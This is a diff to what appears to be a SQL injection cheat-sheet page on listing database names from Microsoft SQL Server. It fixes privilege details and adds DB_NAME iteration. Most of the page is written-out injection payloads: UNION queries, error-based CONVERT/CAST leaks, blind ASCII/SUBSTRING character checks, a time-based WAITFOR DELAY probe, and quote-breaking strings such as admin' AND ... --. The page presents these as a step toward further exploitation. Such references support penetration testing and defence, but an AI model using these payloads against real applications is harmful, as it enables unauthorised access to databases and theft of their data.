@@ -4,19 +4,22 @@ description: How to retrieve database names from Microsoft SQL Server
 category: Information Gathering
 order: 5
 tags: ["database enumeration", "information schema"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Extracting database names is often a crucial step in SQL injection attacks against Microsoft SQL Server. This information helps map the database landscape and identify potential targets for further exploitation.
 
 ## System Tables and Views with Database Information
 
-| Source                        | Description                             | Requires Privileges |
-| ----------------------------- | --------------------------------------- | ------------------- |
-| `sys.databases`               | Contains detailed database information  | Medium              |
-| `master.dbo.sysdatabases`     | Legacy view (older SQL Server versions) | Medium              |
-| `information_schema.schemata` | ANSI standard view for databases        | Low                 |
-| `master..sysdatabases`        | Another legacy format                   | Medium              |
+| Source                 | Description                                        | Requires Privileges |
+| ---------------------- | -------------------------------------------------- | ------------------- |
+| `sys.databases`        | One row per database (SQL Server 2005+)            | Low                 |
+| `master..sysdatabases` | SQL Server 2000 table, compatibility view in 2005+ | Low                 |
+| `DB_NAME(n)`           | Name of the database with ID `n`                   | Low                 |
+
+Every login can list all databases by default, because the `VIEW ANY DATABASE` permission is granted to `public`. If an administrator revokes it, a login only sees `master`, `tempdb`, the current database and the databases it owns (unless it has `CREATE DATABASE` or `ALTER ANY DATABASE`).
+
+`information_schema.schemata` is not a list of databases: it returns the schemas of the current database, and its `catalog_name` column is always the current database name.
 
 ## Current Database Context
 
@@ -40,14 +43,7 @@ FROM sys.databases
 ORDER BY name;
 ```
 
-### Using information_schema (ANSI Standard)
-
-```sql
--- List all database schemas
-SELECT catalog_name FROM information_schema.schemata;
-```
-
-### Using Legacy System Tables (SQL Server 2000 and earlier)
+### Using Legacy System Tables (SQL Server 2000, still available as compatibility views)
 
 ```sql
 -- Using master..sysdatabases
@@ -79,7 +75,7 @@ When you can only retrieve one value at a time, consider using string concatenat
 -- Concatenate database names into a single string
 SELECT STRING_AGG(name, ',') FROM sys.databases;
 
--- For SQL Server 2016 and earlier without STRING_AGG
+-- STRING_AGG needs SQL Server 2017+; for 2005-2016 use FOR XML PATH
 SELECT STUFF((
     SELECT ',' + name
     FROM sys.databases
@@ -90,13 +86,21 @@ SELECT STUFF((
 ### Using FOR XML PATH For Extraction
 
 ```sql
--- Get databases as XML
+-- Get databases as XML: <db>master</db><db>tempdb</db>...
 SELECT name AS 'db' FROM sys.databases FOR XML PATH('');
+```
+
+### Iterating with DB_NAME
+
+`DB_NAME(n)` returns one name per request without needing `TOP` or `ORDER BY`: `DB_NAME(1)` is `master`, 2 `tempdb`, 3 `model`, 4 `msdb`, and user databases usually start at 5. It returns `NULL` for an ID that does not exist.
+
+```sql
+SELECT DB_NAME(5);
 ```
 
 ## Error-Based Extraction
 
-Using error messages to extract database names:
+Converting a string to `int` fails with an error that contains the string (`Conversion failed when converting the nvarchar value 'kbtest' to data type int.`), which leaks the value when the application shows database errors:
 
 ```sql
 -- Error-based extraction using CONVERT
@@ -108,17 +112,19 @@ SELECT CAST((SELECT TOP 1 name FROM sys.databases) AS int);
 
 ## Blind Extraction Techniques
 
-For blind SQL injection:
+For blind SQL injection (numeric context, e.g. `WHERE id = <input>`):
 
 ```sql
--- Check if character at position X matches Y
-AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 -- ASCII 'm' = 109
+-- Check if the first character of the first database name is 'm' (ASCII 109)
+1 AND ASCII(SUBSTRING(DB_NAME(1), 1, 1)) = 109--
 
--- Using time-based verification
-IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 WAITFOR DELAY '0:0:5'
+-- Using time-based verification (stacked statement, see the Timing article)
+1 IF ASCII(SUBSTRING(DB_NAME(1), 1, 1)) = 109 WAITFOR DELAY '0:0:5'--
 ```
 
 ## Practical Examples in Injection Context
+
+String context (`WHERE username = '<input>'`); the UNION example assumes 3 columns, the second one a string:
 
 ```sql
 -- Using UNION attack
@@ -127,14 +133,14 @@ IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1)) = 109 WAITFOR 
 -- Error-based attack
 ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases))--
 
--- Blind attack checking for 'master' database
-' AND SUBSTRING((SELECT TOP 1 name FROM sys.databases ORDER BY name), 1, 6) = 'master'--
+-- Blind attack checking for 'master' database (needs a valid value before the quote)
+admin' AND SUBSTRING((SELECT TOP 1 name FROM sys.databases ORDER BY name), 1, 6) = 'master'--
 ```
 
 ## Notes
 
-1. Some system tables and views require elevated privileges.
+1. Database names are visible to every login unless `VIEW ANY DATABASE` has been revoked from `public`.
 2. The `master` database always exists and is a common first target.
 3. The `sys.databases` view is available from SQL Server 2005 onwards.
-4. `information_schema.schemata` is the most standards-compliant approach.
+4. `information_schema` views only describe the current database; use `sys.databases` or `DB_NAME()` to list databases.
 5. Database names retrieved might be truncated if the output medium has character limitations.
